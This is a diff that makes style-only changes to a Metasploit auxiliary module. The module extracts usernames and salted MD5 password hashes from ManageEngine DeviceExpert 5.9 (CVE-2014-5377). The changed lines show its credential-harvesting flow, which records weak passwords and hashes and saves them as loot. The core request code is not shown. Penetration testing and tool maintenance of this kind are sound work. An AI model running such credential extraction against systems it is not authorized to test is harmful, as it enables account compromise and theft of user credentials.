@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,13 +15,13 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(
       info,
       'Name'           => 'ManageEngine DeviceExpert User Credentials',
-      'Description'    => %q{
+      'Description'    => %q(
         This module extracts usernames and salted MD5 password hashes
         from ManageEngine DeviceExpert version 5.9 build 5980 and prior.
 
         This module has been tested successfully on DeviceExpert
         version 5.9.7 build 5970.
-      },
+      ),
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
@@ -33,12 +34,14 @@ class MetasploitModule < Msf::Auxiliary
           ['OSVDB', '110522'],
           ['CVE', '2014-5377']
         ],
-      'DisclosureDate' => 'Aug 28 2014'))
+      'DisclosureDate' => 'Aug 28 2014'
+    ))
     register_options(
       [
         Opt::RPORT(6060),
         OptBool.new('SSL', [true, 'Use SSL', true])
-      ], self.class)
+      ], self.class
+    )
     deregister_options('RHOST')
   end
 
@@ -81,7 +84,7 @@ class MetasploitModule < Msf::Auxiliary
     [username, pass, hash, role, mail, salt]
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     users = get_users
     return if users.nil?
 
@@ -125,7 +128,7 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Found weak credentials (#{user}:#{pass})")
         credential_data = {
           origin_type: :service,
-          module_fullname: self.fullname,
+          module_fullname: fullname,
           private_type: :password,
           private_data: pass,
           username: user
@@ -133,7 +136,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         credential_data = {
           origin_type: :service,
-          module_fullname: self.fullname,
+          module_fullname: fullname,
           private_type: :nonreplayable_hash,
           private_data: "#{salt}:#{hash}",
           username: user
@@ -149,11 +152,10 @@ class MetasploitModule < Msf::Auxiliary
       }
       login_data.merge!(service_data)
       create_credential_login(login_data)
-
     end
 
     print_line
-    print_line("#{cred_table}")
+    print_line(cred_table.to_s)
     loot_name     = 'manageengine.deviceexpert.user.creds'
     loot_type     = 'text/csv'
     loot_filename = 'manageengine_deviceexpert_user_creds.csv'
@@ -164,7 +166,8 @@ class MetasploitModule < Msf::Auxiliary
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status "Credentials saved in: #{p}"
   end
 end
